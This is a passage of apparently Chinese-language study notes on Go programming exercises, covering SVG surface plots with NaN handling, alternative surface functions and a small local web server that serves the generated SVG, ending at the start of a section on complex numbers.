cy<span class=\"token punctuation\">,</span> dx<span class=\"token punctuation\">,</span> dy<span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n    fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"&lt;/svg&gt;\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token function\">corner</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span> j <span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">float64</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">float64</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token comment\">// Find point (x,y) at corner of cell (i,j).</span>\n    x <span class=\"token operator\">:=</span> xyrange <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span><span class=\"token function\">float64</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token operator\">/</span>cells <span class=\"token operator\">-</span> <span class=\"token number\">0.5</span><span class=\"token punctuation\">)</span>\n    y <span class=\"token operator\">:=</span> xyrange <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span><span class=\"token function\">float64</span><span class=\"token punctuation\">(</span>j<span class=\"token punctuation\">)</span><span class=\"token operator\">/</span>cells <span class=\"token operator\">-</span> <span class=\"token number\">0.5</span><span class=\"token punctuation\">)</span>\n\n    <span class=\"token comment\">// Compute surface height z.</span>\n    z <span class=\"token operator\">:=</span> <span class=\"token function\">f</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">,</span> y<span class=\"token punctuation\">)</span>\n\n    <span class=\"token comment\">// Project (x,y,z) isometrically onto 2-D SVG canvas (sx,sy).</span>\n    sx <span class=\"token operator\">:=</span> width<span class=\"token operator\">/</span><span class=\"token number\">2</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>x<span class=\"token operator\">-</span>y<span class=\"token punctuation\">)</span><span class=\"token operator\">*</span>cos30<span class=\"token operator\">*</span>xyscale\n    sy <span class=\"token operator\">:=</span> height<span class=\"token operator\">/</span><span class=\"token number\">2</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>x<span class=\"token operator\">+</span>y<span class=\"token punctuation\">)</span><span class=\"token operator\">*</span>sin30<span class=\"token operator\">*</span>xyscale <span class=\"token operator\">-</span> z<span class=\"token operator\">*</span>zscale\n    <span class=\"token keyword\">return</span> sx<span class=\"token punctuation\">,</span> sy\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token function\">f</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">,</span> y <span class=\"token builtin\">float64</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">float64</span> <span class=\"token punctuation\">{</span>\n    r <span class=\"token operator\">:=</span> math<span class=\"token punctuation\">.</span><span class=\"token function\">Hypot</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">,</span> y<span class=\"token punctuation\">)</span> <span class=\"token comment\">// distance from (0,0)</span>\n    <span class=\"token keyword\">return</span> math<span class=\"token punctuation\">.</span><span class=\"token function\">Sin</span><span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">)</span> <span class=\"token operator\">/</span> r\n<span class=\"token punctuation\">}</span>\n\n</code></pre></div><h3>练习 3.1</h3>\n<p>如果f函数返回的是无限制的float64值，那么SVG文件可能输出无效的多边形元素（虽然许多SVG渲染器会妥善处理这类问题）。修改程序跳过无效的多边形。</p>\n<p>在for循环里处理一下corner函数的返回值：</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code>\t<span class=\"token keyword\">for</span> i <span class=\"token operator\">:=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> cells<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span> <span class=\"token punctuation\">{</span>\n\t\t<span class=\"token keyword\">for</span> j <span class=\"token operator\">:=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> j <span class=\"token operator\">&lt;</span> cells<span class=\"token punctuation\">;</span> j<span class=\"token operator\">++</span> <span class=\"token punctuation\">{</span>\n\t\t\tax<span class=\"token punctuation\">,</span> ay <span class=\"token operator\">:=</span> <span class=\"token function\">corner</span><span class=\"token punctuation\">(</span>i<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> j<span class=\"token punctuation\">)</span>\n\t\t\tbx<span class=\"token punctuation\">,</span> by <span class=\"token operator\">:=</span> <span class=\"token function\">corner</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span> j<span class=\"token punctuation\">)</span>\n\t\t\tcx<span class=\"token punctuation\">,</span> cy <span class=\"token operator\">:=</span> <span class=\"token function\">corner</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span> j<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n\t\t\tdx<span class=\"token punctuation\">,</span> dy <span class=\"token operator\">:=</span> <span class=\"token function\">corner</span><span class=\"token punctuation\">(</span>i<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> j<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n\t\t\t<span class=\"token comment\">// NOTE: 跳过无效的多边形</span>\n\t\t\t<span class=\"token keyword\">if</span> math<span class=\"token punctuation\">.</span><span class=\"token function\">IsNaN</span><span class=\"token punctuation\">(</span>ax<span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span> math<span class=\"token punctuation\">.</span><span class=\"token function\">IsNaN</span><span class=\"token punctuation\">(</span>ay<span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span> math<span class=\"token punctuation\">.</span><span class=\"token function\">IsNaN</span><span class=\"token punctuation\">(</span>bx<span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span> math<span class=\"token punctuation\">.</span><span class=\"token function\">IsNaN</span><span class=\"token punctuation\">(</span>by<span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span> math<span class=\"token punctuation\">.</span><span class=\"token function\">IsNaN</span><span class=\"token punctuation\">(</span>cx<span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span> math<span class=\"token punctuation\">.</span><span class=\"token function\">IsNaN</span><span class=\"token punctuation\">(</span>cy<span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span> math<span class=\"token punctuation\">.</span><span class=\"token function\">IsNaN</span><span class=\"token punctuation\">(</span>dx<span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span> math<span class=\"token punctuation\">.</span><span class=\"token function\">IsNaN</span><span class=\"token punctuation\">(</span>dy<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t\t\t\t<span class=\"token keyword\">continue</span>\n\t\t\t<span class=\"token punctuation\">}</span>\n\n\t\t\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"&lt;polygon points='%g,%g %g,%g %g,%g %g,%g'/&gt;\\n\"</span><span class=\"token punctuation\">,</span>\n\t\t\t\tax<span class=\"token punctuation\">,</span> ay<span class=\"token punctuation\">,</span> bx<span class=\"token punctuation\">,</span> by<span class=\"token punctuation\">,</span> cx<span class=\"token punctuation\">,</span> cy<span class=\"token punctuation\">,</span> dx<span class=\"token punctuation\">,</span> dy<span class=\"token punctuation\">)</span>\n\n\t\t<span class=\"token punctuation\">}</span>\n</code></pre></div><h3>练习 3.2</h3>\n<p>试验math包中其他函数的渲染图形。你是否能输出一个egg box、moguls或a saddle图案?</p>\n<p>把原本的f(x)改成别的函数</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token keyword\">func</span> <span class=\"token function\">f</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">,</span> y <span class=\"token builtin\">float64</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">float64</span> <span class=\"token punctuation\">{</span>\n\tr <span class=\"token operator\">:=</span> math<span class=\"token punctuation\">.</span><span class=\"token function\">Hypot</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">,</span> y<span class=\"token punctuation\">)</span> <span class=\"token comment\">// distance from (0,0)</span>\n\t<span class=\"token keyword\">return</span> math<span class=\"token punctuation\">.</span><span class=\"token function\">Sin</span><span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">)</span> <span class=\"token operator\">/</span> r\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token function\">eggbox</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">,</span> y <span class=\"token builtin\">float64</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">float64</span> <span class=\"token punctuation\">{</span> <span class=\"token comment\">//鸡蛋盒</span>\n\tr <span class=\"token operator\">:=</span> <span class=\"token number\">0.2</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>math<span class=\"token punctuation\">.</span><span class=\"token function\">Cos</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> math<span class=\"token punctuation\">.</span><span class=\"token function\">Cos</span><span class=\"token punctuation\">(</span>y<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\t<span class=\"token keyword\">return</span> r\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token function\">saddle</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">,</span> y <span class=\"token builtin\">float64</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">float64</span> <span class=\"token punctuation\">{</span> <span class=\"token comment\">//马鞍</span>\n\ta <span class=\"token operator\">:=</span> <span class=\"token number\">25.0</span> <span class=\"token operator\">*</span> <span class=\"token number\">25.0</span>\n\tb <span class=\"token operator\">:=</span> <span class=\"token number\">17.0</span> <span class=\"token operator\">*</span> <span class=\"token number\">17.0</span>\n\tr <span class=\"token operator\">:=</span> math<span class=\"token punctuation\">.</span><span class=\"token function\">Pow</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">/</span> a <span class=\"token operator\">*</span> math<span class=\"token punctuation\">.</span><span class=\"token function\">Pow</span><span class=\"token punctuation\">(</span>y<span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">/</span> b\n\t<span class=\"token keyword\">return</span> r\n<span class=\"token punctuation\">}</span>\n</code></pre></div><h3>练习 3.3</h3>\n<p>根据高度给每个多边形上色，那样峰值部将是红色（#ff0000），谷部将是蓝色（#0000ff）。</p>\n<p>感觉不难 但我不会</p>\n<h3>练习 3.4</h3>\n<p>参考1.7节Lissajous例子的函数，构造一个web服务器，用于计算函数曲面然后返回SVG数据给客户端。允许客户端通过HTTP请求参数设置高度、宽度和颜色等参数。</p>\n<p>服务器必须设置Content-Type头部：（因为服务器使用标准的PNG图像格式，可以根据前面的512个字节自动输出对应的头部。</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code>w<span class=\"token punctuation\">.</span><span class=\"token function\">Header</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">Set</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Content-Type\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"image/svg+xml\"</span><span class=\"token punctuation\">)</span>\n</code></pre></div><p>打印异常的时候还得把\"Content-Type\"转成text，要不然：</p>\n<figure><figcaption>image-20240415143331842</figcaption></figure>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token keyword\">package</span> main\n\n<span class=\"token keyword\">import</span> <span class=\"token punctuation\">(</span>\n\t<span class=\"token string\">\"fmt\"</span>\n\t<span class=\"token string\">\"log\"</span>\n\t<span class=\"token string\">\"math\"</span>\n\t<span class=\"token string\">\"net/http\"</span>\n\t<span class=\"token string\">\"strconv\"</span>\n<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">const</span> <span class=\"token punctuation\">(</span>\n\tcells   <span class=\"token operator\">=</span> <span class=\"token number\">100</span>         <span class=\"token comment\">// number of grid cells</span>\n\txyrange <span class=\"token operator\">=</span> <span class=\"token number\">30.0</span>        <span class=\"token comment\">// axis ranges (-xyrange .....+xyrange)</span>\n\tangle   <span class=\"token operator\">=</span> math<span class=\"token punctuation\">.</span>Pi <span class=\"token operator\">/</span> <span class=\"token number\">6</span> <span class=\"token comment\">// angle of x,y axes (=30˚)</span>\n<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">var</span> sin30<span class=\"token punctuation\">,</span> cos30 <span class=\"token operator\">=</span> math<span class=\"token punctuation\">.</span><span class=\"token function\">Sin</span><span class=\"token punctuation\">(</span>angle<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> math<span class=\"token punctuation\">.</span><span class=\"token function\">Cos</span><span class=\"token punctuation\">(</span>angle<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\thttp<span class=\"token punctuation\">.</span><span class=\"token function\">HandleFunc</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/\"</span><span class=\"token punctuation\">,</span> handler<span class=\"token punctuation\">)</span>\n\terr <span class=\"token operator\">:=</span> http<span class=\"token punctuation\">.</span><span class=\"token function\">ListenAndServe</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"localhost:8888\"</span><span class=\"token punctuation\">,</span> <span class=\"token boolean\">nil</span><span class=\"token punctuation\">)</span>\n\tlog<span class=\"token punctuation\">.</span><span class=\"token function\">Fatal</span><span class=\"token punctuation\">(</span>err<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token function\">handler</span><span class=\"token punctuation\">(</span>w http<span class=\"token punctuation\">.</span>ResponseWriter<span class=\"token punctuation\">,</span> r <span class=\"token operator\">*</span>http<span class=\"token punctuation\">.</span>Request<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t<span class=\"token comment\">// NOTE: 不加Content-Type，浏览器显示的是svg文件内容，而不是解析显示为图片</span>\n\tw<span class=\"token punctuation\">.</span><span class=\"token function\">Header</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">Set</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Content-Type\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"image/svg+xml\"</span><span class=\"token punctuation\">)</span>\n\twidth <span class=\"token operator\">:=</span> r<span class=\"token punctuation\">.</span><span class=\"token function\">FormValue</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"width\"</span><span class=\"token punctuation\">)</span>\n\twidthInt<span class=\"token punctuation\">,</span> err <span class=\"token operator\">:=</span> strconv<span class=\"token punctuation\">.</span><span class=\"token function\">ParseInt</span><span class=\"token punctuation\">(</span>width<span class=\"token punctuation\">,</span> <span class=\"token number\">10</span><span class=\"token punctuation\">,</span> <span class=\"token number\">64</span><span class=\"token punctuation\">)</span>\n\t<span class=\"token keyword\">if</span> err <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">{</span>\n\t\t<span class=\"token comment\">// 这里打印异常，要把Content-Type转成text，要不然</span>\n\t\t<span class=\"token comment\">// This page contains the following errors: error on line 1 at column 75: EntityRef: expecting ';'</span>\n\t\tw<span class=\"token punctuation\">.</span><span class=\"token function\">Header</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">Set</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Content-Type\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"text/html; charset=utf-8\"</span><span class=\"token punctuation\">)</span>\n\t\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Fprintf</span><span class=\"token punctuation\">(</span>w<span class=\"token punctuation\">,</span> <span class=\"token string\">\"&lt;html&gt;&lt;body&gt;请按要求填写参数'width'!!!例如: http://localhost:8888/?width=2160&amp;height=1280&amp;color=red&lt;/body&gt;&lt;/html&gt;\"</span><span class=\"token punctuation\">)</span>\n\t\t<span class=\"token keyword\">return</span>\n\t<span class=\"token punctuation\">}</span>\n\theight <span class=\"token operator\">:=</span> r<span class=\"token punctuation\">.</span><span class=\"token function\">FormValue</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"height\"</span><span class=\"token punctuation\">)</span>\n\theightInt<span class=\"token punctuation\">,</span> err <span class=\"token operator\">:=</span> strconv<span class=\"token punctuation\">.</span><span class=\"token function\">ParseInt</span><span class=\"token punctuation\">(</span>height<span class=\"token punctuation\">,</span> <span class=\"token number\">10</span><span class=\"token punctuation\">,</span> <span class=\"token number\">64</span><span class=\"token punctuation\">)</span>\n\t<span class=\"token keyword\">if</span> err <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">{</span>\n\t\tw<span class=\"token punctuation\">.</span><span class=\"token function\">Header</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">Set</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Content-Type\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"text/html; charset=utf-8\"</span><span class=\"token punctuation\">)</span>\n\t\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Fprintf</span><span class=\"token punctuation\">(</span>w<span class=\"token punctuation\">,</span> <span class=\"token string\">\"&lt;html&gt;&lt;body&gt;请按要求填写参数'height'!!!例如: http://localhost:8888/?width=2160&amp;height=1280&amp;color=red&lt;/body&gt;&lt;/html&gt;\"</span><span class=\"token punctuation\">)</span>\n\t\t<span class=\"token keyword\">return</span>\n\t<span class=\"token punctuation\">}</span>\n\tcolor <span class=\"token operator\">:=</span> r<span class=\"token punctuation\">.</span><span class=\"token function\">FormValue</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"color\"</span><span class=\"token punctuation\">)</span>\n\t<span class=\"token function\">surface</span><span class=\"token punctuation\">(</span>w<span class=\"token punctuation\">,</span> widthInt<span class=\"token punctuation\">,</span> heightInt<span class=\"token punctuation\">,</span> color<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token function\">surface</span><span class=\"token punctuation\">(</span>out http<span class=\"token punctuation\">.</span>ResponseWriter<span class=\"token punctuation\">,</span> width <span class=\"token builtin\">int64</span><span class=\"token punctuation\">,</span> height <span class=\"token builtin\">int64</span><span class=\"token punctuation\">,</span> color <span class=\"token builtin\">string</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t<span class=\"token comment\">// NOTE: Header.Set(.... image/svg+xml)填这也行</span>\n\t<span class=\"token comment\">// out.Header().Set(\"Content-Type\", \"image/svg+xml\")</span>\n\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Fprintf</span><span class=\"token punctuation\">(</span>out<span class=\"token punctuation\">,</span> <span class=\"token string\">\"&lt;svg xmlns='http://www.w3.org/2000/svg'\"</span><span class=\"token operator\">+</span>\n\t\t<span class=\"token string\">\" style='stroke: %s;fill:white;stroke-width:0.7'\"</span><span class=\"token operator\">+</span>\n\t\t<span class=\"token string\">\" width='%d' height='%d'&gt;\"</span><span class=\"token punctuation\">,</span> color<span class=\"token punctuation\">,</span> width<span class=\"token punctuation\">,</span> height<span class=\"token punctuation\">)</span>\n\t<span class=\"token keyword\">for</span> i <span class=\"token operator\">:=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> cells<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span> <span class=\"token punctuation\">{</span>\n\t\t<span class=\"token keyword\">for</span> j <span class=\"token operator\">:=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> j <span class=\"token operator\">&lt;</span> cells<span class=\"token punctuation\">;</span> j<span class=\"token operator\">++</span> <span class=\"token punctuation\">{</span>\n\t\t\tax<span class=\"token punctuation\">,</span> ay <span class=\"token operator\">:=</span> <span class=\"token function\">corner</span><span class=\"token punctuation\">(</span>i<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> j<span class=\"token punctuation\">,</span> width<span class=\"token punctuation\">,</span> height<span class=\"token punctuation\">)</span>\n\t\t\tbx<span class=\"token punctuation\">,</span> by <span class=\"token operator\">:=</span> <span class=\"token function\">corner</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span> j<span class=\"token punctuation\">,</span> width<span class=\"token punctuation\">,</span> height<span class=\"token punctuation\">)</span>\n\t\t\tcx<span class=\"token punctuation\">,</span> cy <span class=\"token operator\">:=</span> <span class=\"token function\">corner</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span> j<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> width<span class=\"token punctuation\">,</span> height<span class=\"token punctuation\">)</span>\n\t\t\tdx<span class=\"token punctuation\">,</span> dy <span class=\"token operator\">:=</span> <span class=\"token function\">corner</span><span class=\"token punctuation\">(</span>i<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> j<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> width<span class=\"token punctuation\">,</span> height<span class=\"token punctuation\">)</span>\n\n\t\t\t<span class=\"token keyword\">if</span> math<span class=\"token punctuation\">.</span><span class=\"token function\">IsNaN</span><span class=\"token punctuation\">(</span>ax<span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span> math<span class=\"token punctuation\">.</span><span class=\"token function\">IsNaN</span><span class=\"token punctuation\">(</span>ay<span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span> math<span class=\"token punctuation\">.</span><span class=\"token function\">IsNaN</span><span class=\"token punctuation\">(</span>bx<span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span> math<span class=\"token punctuation\">.</span><span class=\"token function\">IsNaN</span><span class=\"token punctuation\">(</span>by<span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span> math<span class=\"token punctuation\">.</span><span class=\"token function\">IsNaN</span><span class=\"token punctuation\">(</span>cx<span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span> math<span class=\"token punctuation\">.</span><span class=\"token function\">IsNaN</span><span class=\"token punctuation\">(</span>cy<span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span> math<span class=\"token punctuation\">.</span><span class=\"token function\">IsNaN</span><span class=\"token punctuation\">(</span>dx<span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span> math<span class=\"token punctuation\">.</span><span class=\"token function\">IsNaN</span><span class=\"token punctuation\">(</span>dy<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t\t\t\t<span class=\"token comment\">// 跳过无效的多边形</span>\n\t\t\t\t<span class=\"token keyword\">continue</span>\n\t\t\t<span class=\"token punctuation\">}</span>\n\n\t\t\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Fprintf</span><span class=\"token punctuation\">(</span>out<span class=\"token punctuation\">,</span> <span class=\"token string\">\"&lt;polygon points='%g,%g %g,%g %g,%g %g,%g'/&gt;\\n\"</span><span class=\"token punctuation\">,</span>\n\t\t\t\tax<span class=\"token punctuation\">,</span> ay<span class=\"token punctuation\">,</span> bx<span class=\"token punctuation\">,</span> by<span class=\"token punctuation\">,</span> cx<span class=\"token punctuation\">,</span> cy<span class=\"token punctuation\">,</span> dx<span class=\"token punctuation\">,</span> dy<span class=\"token punctuation\">)</span>\n\t\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token punctuation\">}</span>\n\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Fprintln</span><span class=\"token punctuation\">(</span>out<span class=\"token punctuation\">,</span> <span class=\"token string\">\"&lt;/svg&gt;\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token function\">corner</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span> j <span class=\"token builtin\">int</span><span class=\"token punctuation\">,</span> width <span class=\"token builtin\">int64</span><span class=\"token punctuation\">,</span> height <span class=\"token builtin\">int64</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">float64</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">float64</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t<span class=\"token comment\">// Find Point (x, y) at corner of cell(i, j)</span>\n\tx <span class=\"token operator\">:=</span> xyrange <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span><span class=\"token function\">float64</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token operator\">/</span>cells <span class=\"token operator\">-</span> <span class=\"token number\">0.5</span><span class=\"token punctuation\">)</span>\n\ty <span class=\"token operator\">:=</span> xyrange <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span><span class=\"token function\">float64</span><span class=\"token punctuation\">(</span>j<span class=\"token punctuation\">)</span><span class=\"token operator\">/</span>cells <span class=\"token operator\">-</span> <span class=\"token number\">0.5</span><span class=\"token punctuation\">)</span>\n\n\tzscale <span class=\"token operator\">:=</span> <span class=\"token function\">float64</span><span class=\"token punctuation\">(</span>height<span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token number\">0.4</span>         <span class=\"token comment\">// pixels per z unit</span>\n\txyscale <span class=\"token operator\">:=</span> <span class=\"token function\">float64</span><span class=\"token punctuation\">(</span>width<span class=\"token punctuation\">)</span> <span class=\"token operator\">/</span> <span class=\"token number\">2</span> <span class=\"token operator\">/</span> xyrange <span class=\"token comment\">// pixels per x or y unit</span>\n\n\t<span class=\"token comment\">// compute surface height z</span>\n\tz <span class=\"token operator\">:=</span> <span class=\"token function\">f</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">,</span> y<span class=\"token punctuation\">)</span>\n\n\t<span class=\"token comment\">// project (x,y,z) isometrically onto 2-D SVG canvas (sx, sy)</span>\n\tsx <span class=\"token operator\">:=</span> <span class=\"token function\">float64</span><span class=\"token punctuation\">(</span>width<span class=\"token operator\">/</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>x<span class=\"token operator\">-</span>y<span class=\"token punctuation\">)</span><span class=\"token operator\">*</span>cos30<span class=\"token operator\">*</span>xyscale\n\tsy <span class=\"token operator\">:=</span> <span class=\"token function\">float64</span><span class=\"token punctuation\">(</span>height<span class=\"token operator\">/</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>x<span class=\"token operator\">+</span>y<span class=\"token punctuation\">)</span><span class=\"token operator\">*</span>sin30<span class=\"token operator\">*</span>xyscale <span class=\"token operator\">-</span> z<span class=\"token operator\">*</span>zscale\n\t<span class=\"token keyword\">return</span> sx<span class=\"token punctuation\">,</span> sy\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token function\">f</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">,</span> y <span class=\"token builtin\">float64</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">float64</span> <span class=\"token punctuation\">{</span>\n\tr <span class=\"token operator\">:=</span> math<span class=\"token punctuation\">.</span><span class=\"token function\">Hypot</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">,</span> y<span class=\"token punctuation\">)</span> <span class=\"token comment\">// distance from (0,0)</span>\n\t<span class=\"token keyword\">return</span> math<span class=\"token punctuation\">.</span><span class=\"token function\">Sin</span><span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">)</span> <span class=\"token operator\">/</span> r\n<span class=\"token punctuation\">}</span>\n\n</code></pre></div><h2>3.3. 复数</h2>\n<h3>复数表达式</h3>\n<p>Go语言提供了两种精度的复数类型：complex64和complex128，分别对应float32和float64两种浮点数精度。内置的complex函数用于构建复数，内建的real和imag函数分别返回复数的实部和虚部：</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token keyword\">var</span> x <span class=\"token builtin\">complex128</span> <span class=\"token operator\">=</span> <span class=\"token function\">complex</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// 1+2i</span>\n<span class=\"token keyword\">var</span> y <span class=\"token builtin\">complex128</span> <span class=\"token operator\">=</span> <span class=\"token function\">complex</span><span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// 3+4i</span>\nfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span>x<span class=\"token operator\">*</span>y<span class=\"token punctuation\">)</span>                 <span class=\"token comment\">// \"(-5+10i)\"</span>\nfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span><span class=\"token function\">real</span><span class=\"token punctuation\">(</span>x<span class=\"token operator\">*</span>y<span class=\"token 